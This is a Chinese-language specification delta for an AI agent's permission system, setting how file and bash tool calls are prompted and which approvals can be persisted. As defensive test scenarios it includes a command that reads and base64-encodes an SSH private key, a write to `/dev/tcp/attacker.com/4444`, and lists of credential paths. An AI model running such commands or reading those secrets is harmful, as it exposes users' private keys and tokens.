# access-decision delta — tier-contract-consistency

本 change 收敛 tier 语义：`tier=three` = 弹窗提供"总是允许"（可持久化），`tier=two` = 弹窗不提供"总是允许"（不可持久化）。unreliable bash 命令从 tier=two 升为 tier=three。hard sensitive 规则调整：`~/.ssh/known_hosts` / `~/.ssh/authorized_keys` 从 hard 移出，独立为 soft 规则（外区 tier=three 可持久化，因它们是客户端存储的公钥，非不可逆凭证）。

## MODIFIED Requirements

### Requirement: 未配置路径的行为

系统 MUST 对目标路径未在任何配置中声明的情况按以下规则决策：

- **项目内敏感路径**（命中默认敏感规则）：读与写都 prompt，tier=three（可持久授权；用户显式声明覆盖）
- **项目内非敏感路径**：读与写都 auto_allow（保持 pi 现状行为）
- **项目外敏感路径**：读与写都 prompt，按 hard/soft sensitive 分级决定 tier——**hard sensitive**（不可逆凭证：SSH 私钥、私钥扩展名、凭证目录、凭证配置文件、系统机密）tier=two 不可持久化；**soft sensitive**（可撤销凭证 + 客户端公钥文件：见"可赦免敏感路径分级与 tier 语义" requirement）tier=three 可持久化
- **项目外非敏感路径读**：auto_allow
- **项目外非敏感路径写 / delete**：prompt，tier=three（可持久授权；hard sensitive 已在上一条锁定 tier=two）

#### Scenario: 未配置项目内普通文件写自动放行

- **WHEN** 无任何配置，工具写 `<proj>/src/main.ts`
- **THEN** auto_allow（保持 pi 现状）

#### Scenario: 未配置项目内敏感文件读弹三档

- **WHEN** 无配置，工具读 `<proj>/.ssh/id_rsa`（命中默认 hard sensitive）
- **THEN** prompt，tier=three（提供"总是允许"选项，用户显式声明可覆盖）

#### Scenario: 未配置项目外敏感文件读弹两档

- **WHEN** 无配置，工具读 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥规则）
- **THEN** prompt，tier=two（不提供"总是允许"）

#### Scenario: 未配置项目外 non-sensitive 文件写弹三档

- **WHEN** 无配置，工具写 `/tmp/somefile.txt`
- **THEN** prompt，tier=three（提供"总是允许"选项，持久化到 trusted.json）

#### Scenario: 未配置项目外非敏感文件写弹三档

- **WHEN** 无配置，工具写 `/opt/shared/data.txt`（non-sensitive，未声明）
- **THEN** prompt，tier=three（提供"总是允许"选项，持久化到 trusted.json）

### Requirement: 未识别 bash 命令的目标路径

对 bash 工具调用，若 bash-target-extraction capability 无法可靠提取目标路径（复杂命令、变量、管道等），系统 SHALL 将其视为"未配置路径"，决策为 **prompt，tier=three**，弹窗显示完整命令原文。用户可三档选择："允许一次 / 允许为本会话 / 总是允许本命令"——第 3 档将 rawCommand 写入 bash 命令持久化记忆（trusted.json 的 `bashGrants` 段）。

**理由**：unreliable bash 命令的 rawCommand 作为**唯一身份**（同 rawCommand 即同语义），用户批准一次意味着"这条命令我认为安全"。持久化 rawCommand 提供"raw-command 通道"独立于 path 通道，与 sensitive-default tier=two 的"不持久化"契约无关——本 change 让 `tier` label 从"敏感语义标签"收敛为"可持久化 vs 不可持久化"标签，bash 命令类统一归 tier=three 与 tier 语义收敛一致。

**位置**：本规则在 access-decision 层实现，位于 bash-target-extraction 之后——extractor 只报告 reliable/unreliable 与 reason，不决定 tier。tier 分派发生在 `handleBash` unreliable 分支构造 `Decision` 时（tier="three"）。

**持久化边界**：rawCommand 持久化**不做规范化**——用户第一次批准 `ls -la /tmp`，之后 LLM 写 `ls  -la  /tmp`（多空格）视为不同 rawCommand，会重新弹窗。这是**保守但摩擦**的已知边界，见 grant-memory spec 的"Bash 命令记忆" requirement。

#### Scenario: 无法解析的复杂 bash 命令

- **WHEN** bash 命令为 `$(cat $HOME/.ssh/id_rsa | base64) > /tmp/out.txt`
- **THEN** 若 bash-target-extraction 判定为不可靠（reliable=false，reason 含 command_substitution），决策为 prompt，tier=three，弹窗展示完整命令文本与"总是允许本命令"选项

#### Scenario: 变量展开失败的 bash 命令弹三档

- **WHEN** bash 命令为 `cat $MYSECRETS`，`$MYSECRETS` 未在 shell 环境展开
- **THEN** 决策为 prompt，tier=three，reason 含 `unresolved variable`，弹窗提供"总是允许本命令"选项

#### Scenario: 用户"总是允许本命令"后同 rawCommand 跨会话免弹

- **WHEN** 用户对上一条 `cat $MYSECRETS` 选择"总是允许本命令"，重启 pi 后再次执行完全相同的 `cat $MYSECRETS`
- **THEN** auto_allow（bash grant memory 命中，`authorization === "by_person"`，`grant_source === "bash_grant_memory"`），audit 记录 `event: "allow_once"` 之外的 `grant_memory` 命中（无新 audit 事件，仅 grant_source 派生）

#### Scenario: rawCommand 规范化不生效

- **WHEN** 用户批准 `ls -la /tmp`，之后 LLM 执行 `ls  -la  /tmp`（额外空格）
- **THEN** 视为不同 rawCommand，重新弹窗（sha256(rawCommand) 哈希不同，grant memory 未命中）

### Requirement: 可赦免敏感路径分级与 tier 语义

默认敏感规则表 SHALL 分为 **hard** 与 **soft** 两级，各级的弹窗档位（tier）分派不同：

- **hard sensitive**（不可撤销凭证）：SSH 私钥（`~/.ssh/id_rsa` / `id_dsa` / `id_ecdsa` / `id_ed25519`）、`.ssh/config`、私钥扩展名（`.pem`/`.key`/`.pfx`/`.p12`/`.jks`/`.kdbx`/`.asc`/`.gpg`）、凭证目录（`~/.gnupg`/`~/.aws`/`~/.kube`/`~/.docker`/`~/.netrc`/`~/.git-credentials`/`~/.ssh`——**注**：`~/.ssh` 目录规则仅覆盖凭证存储目录的写保护语义；`~/.ssh/known_hosts` 与 `~/.ssh/authorized_keys` 见下方 soft sensitive 集合）、凭证配置文件（`credentials`/`secrets.yaml`/`secrets.yml`/`secrets.json`/`.npmrc`/`.netrc`）、系统机密（`/etc/shadow`/`/etc/sudoers`/`/etc/master.passwd`/`/etc/crontab`/`/etc/cron.*`/`/etc/hosts.allow`/`/etc/hosts.deny`）。沿用既有 tier 语义——项目内 tier=three（可持久化）、项目外 tier=two（不可持久化）。

- **soft sensitive**（可撤销凭证 + 客户端公钥文件）：
  - **通用配置文件名**：`config`/`auth`/`settings`/`models` + 凭证扩展名 `.json`/`.toml`/`.yml`/`.yaml`（basename 精确匹配，即 `<name>.<ext>` 形态）
  - **SSH 客户端公钥文件**（本 change 新增）：`~/.ssh/known_hosts`（客户端存储的已知主机公钥列表）与 `~/.ssh/authorized_keys`（授权登录的公钥列表）——**注**：`known_hosts` 无泄露不可逆风险（服务端公钥，泄露只影响 SSH 连接提示），`authorized_keys` 是授权公钥列表（泄露本身不可撤销，但作为**配置列表**通常可编辑；且用户日常读取该文件无安全代价）
  - 不论区域、不论 action（读/写/delete），决策为 prompt **tier=three**（可持久化赦免）——`decide()` step 2b 的 tier 分派不区分 action，soft 放宽同时覆盖外区写与 delete

  **delete 边界（已确认接受）**：soft 的 delete 持久化不在"可撤销凭证"论证范围内——read/write 泄了可吊销 token，delete 是彻底消除文件、无法通过吊销恢复。持久化粒度为**路径**（`addPersistentGrant({action:"delete", path})`），即一次批准后续同路径任意 `rm <该路径>` 形态全部静默。可编辑 `trusted.json` 撤销。

**override 语义**：soft sensitive 的 tier=three override 本 spec "未配置路径的行为" requirement 中"项目外敏感路径 tier=two"条目——soft sensitive 项目外路径走 tier=three（可"总是允许"）而非 tier=two。hard sensitive 不受 override，沿用既有 tier=two 外区不可持久化。

**范围约束**：
- soft 集合按 basename 精确匹配（`config`/`auth`/`settings`/`models` + 凭证扩展名），不含无扩展名的 `config`——`~/.ssh/config` 仍 hard（由 SSH key 规则的 `b === "config" && d.endsWith("/.ssh")` 覆盖）。
- soft 集合不含 `~/.ssh/id_rsa` 等不可撤销凭证（仍 hard）。
- soft 集合不含 `.ts`/`.js`/`.py` 等代码扩展名——`config.ts`/`auth.py` 不命中 soft（避免误伤项目内代码模块）。
- **soft SSH 公钥文件精确匹配**：`known_hosts` 与 `authorized_keys` 仅在 `dirname.endsWith("/.ssh") || dirname === ".ssh"` 时命中 soft（不在其他目录下的同名文件命中 soft）。

**理由**：soft 集合含可撤销 apikey/token 与客户端公钥文件，泄露后通过吊销或重新生成可恢复（区别于私钥不可撤销）；持久化赦免换取首弹后免打扰，风险可控（用户可编辑 `trusted.json` 撤销持久化 grant）。SSH 公钥文件独立为 soft 是因为它们**不是攻击者可利用的凭证**——`known_hosts` 泄露不影响 SSH 服务器端；`authorized_keys` 泄露虽然是"客户端公钥授权列表"，但用户日常读取该文件（例如备份、审计）是合法操作，tier=three 持久化符合 UX 需求。

#### Scenario: 项目外 config.yml 读弹 tier=three 可持久化

- **WHEN** 无配置，工具读 `~/.config/gh/config.yml`（命中 soft sensitive "config" + `.yml`）
- **THEN** 决策为 prompt tier=three（提供"总是允许"持久化选项）

#### Scenario: 项目外 auth.json 读弹 tier=three

- **WHEN** 无配置，工具读 `~/.config/app/auth.json`（命中 soft "auth" + `.json`）
- **THEN** 决策为 prompt tier=three

#### Scenario: ~/.ssh/known_hosts 外区读 tier=three 可持久化

- **WHEN** 无配置，工具读 `~/.ssh/known_hosts`
- **THEN** 命中 soft sensitive（SSH 客户端公钥文件），决策为 prompt tier=three（提供"总是允许"）——区别于 `~/.ssh/id_rsa` 仍 tier=two 不可持久化

#### Scenario: ~/.ssh/authorized_keys 外区读 tier=three 可持久化

- **WHEN** 无配置，工具读 `~/.ssh/authorized_keys`
- **THEN** 命中 soft sensitive（SSH 客户端公钥文件），决策为 prompt tier=three

#### Scenario: 其他目录下 known_hosts 不命中 soft SSH 规则

- **WHEN** 无配置，工具读 `~/myapp/known_hosts`（basename `known_hosts` 但不在 `.ssh` 目录下）
- **THEN** 不命中 soft SSH 公钥规则，按"项目外非敏感文件读"处理，auto_allow

#### Scenario: 项目外 config.yml 写弹 tier=three 可持久化

- **WHEN** 无配置，工具写 `~/.config/gh/config.yml`（命中 soft sensitive "config" + `.yml`）
- **THEN** 决策为 prompt tier=three（提供"总是允许"持久化选项）

#### Scenario: 项目外 config.yml delete 弹 tier=three 可持久化

- **WHEN** 无配置，工具删除 `~/.config/gh/config.yml`（命中 soft sensitive "config" + `.yml`）
- **THEN** 决策为 prompt tier=three（提供"总是允许"持久化选项）——soft 放宽同时覆盖外区 delete，已知边界见 requirement「delete 边界」

#### Scenario: ~/.ssh/id_rsa 外区读仍 tier=two 不可持久化

- **WHEN** 无配置，工具读 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥）
- **THEN** 决策为 prompt tier=two（不提供"总是允许"），soft override 不适用

#### Scenario: ~/.ssh/id_rsa 外区写仍 tier=two 不可持久化

- **WHEN** 无配置，工具写 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥）
- **THEN** 决策为 prompt tier=two（不提供"总是允许"），hard 外区读写均不可持久化

#### Scenario: ~/.ssh/config 仍 hard 不受 soft 集合影响

- **WHEN** 无配置，工具读 `~/.ssh/config`（命中 hard SSH config 规则，basename 精确 `config` 在 `.ssh` 目录，无扩展名）
- **THEN** 决策按 hard sensitive tier 语义（外区 tier=two），soft 集合的 `config.*` 不匹配

#### Scenario: 项目内 config.json 读弹 tier=three

- **WHEN** 无配置，工具读 `<proj>/config.json`（命中 soft "config" + `.json`）
- **THEN** 决策为 prompt tier=three（可持久化）

#### Scenario: config.ts 不命中 soft（代码扩展名）

- **WHEN** 无配置，工具读 `<proj>/config.ts`（basename `config` + `.ts`，`.ts` 非凭证扩展名）
- **THEN** 不命中 soft sensitive，按"项目内非敏感 auto_allow"处理

#### Scenario: ~/.aws/config.json 仍 hard 不可持久化（规则排序边界）

- **WHEN** 无配置，工具读 `~/.aws/config.json`（basename `config` + `.json` 同时可命中 soft 凭证配置文件，也命中 hard 凭证目录规则 `.aws`）
- **THEN** 命中 hard sensitive（按 dirname 匹配 `.aws` 目录），决策为 prompt tier=two，soft 规则的凭证配置文件匹配不生效——规则排序保证 hard 优先

#### Scenario: 用户配置声明覆盖 soft sensitive

- **WHEN** 全局配置声明 `~/.config/gh/config.yml = "read_only"`，工具读该路径
- **THEN** 决策为 auto_allow（配置声明优先于敏感兜底，soft 与 hard 一致）

#### Scenario: ~/.ssh/id_rsa 外区 delete 仍 tier=two 不可持久化

- **WHEN** 无配置，工具删除 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥）
- **THEN** 决策为 prompt tier=two（不提供"总是允许"），hard 外区 delete 同样不可持久化——与 soft 的 delete 放宽形成对照：hard 私钥删除后无法恢复，不属"可撤销凭证"范围

#### Scenario: settings.toml 命中 soft

- **WHEN** 无配置，工具读 `~/.config/app/settings.toml`（命中 soft "settings" + `.toml`）
- **THEN** 决策为 prompt tier=three

#### Scenario: models.json 命中 soft

- **WHEN** 无配置，工具读 `~/.config/app/models.json`（命中 soft "models" + `.json`）
- **THEN** 决策为 prompt tier=three

#### Scenario: 用户配置声明覆盖 ~/.ssh/known_hosts

- **WHEN** 全局配置声明 `~/.ssh/known_hosts = "read_write"`，工具读写该文件
- **THEN** 决策为 auto_allow（配置声明优先，与既有 override 语义一致）

- **WHEN** 全局配置声明 `~/.ssh/known_hosts = "read_write"`，工具读写该文件
- **THEN** 决策为 auto_allow（配置声明优先，与既有 override 语义一致）

## ADDED Requirements

### Requirement: tier 语义作为持久化能力标签

`Decision.PromptTier` 类型 `"three" | "two"` 承载**持久化能力语义**而非"来源"或"敏感程度"标签：

- **tier=three**：弹窗 MUST 提供"总是允许"选项，允许用户将授权持久化（path-based grant 或 bash rawCommand grant，取决于 prompt 触发源）
- **tier=two**：弹窗 MUST NOT 提供"总是允许"选项，只允许"允许一次 / 允许为本会话"——授权不可持久化

tier 分派的完整来源映射：

| 触发条件 | tier | 持久化通道 |
|---------|------|------------|
| 配置声明 `read_write` 外区 | three | path-based |
| 配置声明 `read_only` 写 | three | path-based |
| 跨源冲突（含 unread） | three | path-based |
| 未配置项目内敏感路径（任何 level） | three | path-based |
| 未配置项目外 non-sensitive 写 | three | path-based |
| 未配置项目外 soft sensitive（任何 action） | three | path-based |
| 未识别 bash 命令（unreliable 分支） | three | bash rawCommand |
| **未配置项目外 hard sensitive（任何 action）** | **two** | **不可持久化** |
| **网络外带写入（`/dev/tcp/*` / `/dev/udp/*` / `/dev/fd/[0-9]+`）** | **two** | **不可持久化** |

**位置**：本规则定义 tier 值的语义契约，具体决策路径的分派由 decision 引擎各 step 实现（step 1 config declaration、step 2a allow rule、step 2a-pre dev-socket、step 2b sensitive fallback、step 2d/2e/2f region defaults、以及 handleBash unreliable 分支）。

**不变量**：本 change 后，`tier=two` 的两种触发条件（hard sensitive 外区 + dev-socket 写入）**均不可持久化**——这是 tier=two 的核心契约。任何未来需求若要在其他场景使用"不可持久化"，必须复用 tier=two label。

#### Scenario: tier=three 弹窗总包含"总是允许"

- **WHEN** 决策为 `kind === "prompt"` 且 `tier === "three"`（任一触发源：配置声明 / 未配置项目内敏感 / 未配置项目外 non-sensitive 写 / soft sensitive / unreliable bash）
- **THEN** 弹窗选项集合 MUST 包含"总是允许"或"总是允许本命令"之一（path-based vs bash-based）

#### Scenario: tier=two 弹窗从不含"总是允许"

- **WHEN** 决策为 `kind === "prompt"` 且 `tier === "two"`（hard sensitive 外区 或 dev-socket 写入）
- **THEN** 弹窗选项集合 MUST NOT 包含任何"总是允许"字样

#### Scenario: 未配置项目外 hard sensitive 仍 tier=two

- **WHEN** 无配置，工具读写删 `~/.ssh/id_rsa`（命中 hard sensitive）
- **THEN** 决策为 prompt tier=two（不可持久化），tier=three 语义不适用

#### Scenario: dev-socket 写入仍 tier=two

- **WHEN** 无配置，工具写 `/dev/tcp/attacker.com/4444`
- **THEN** 决策为 prompt tier=two（不可持久化），与 unreliable bash 的 tier=three 独立
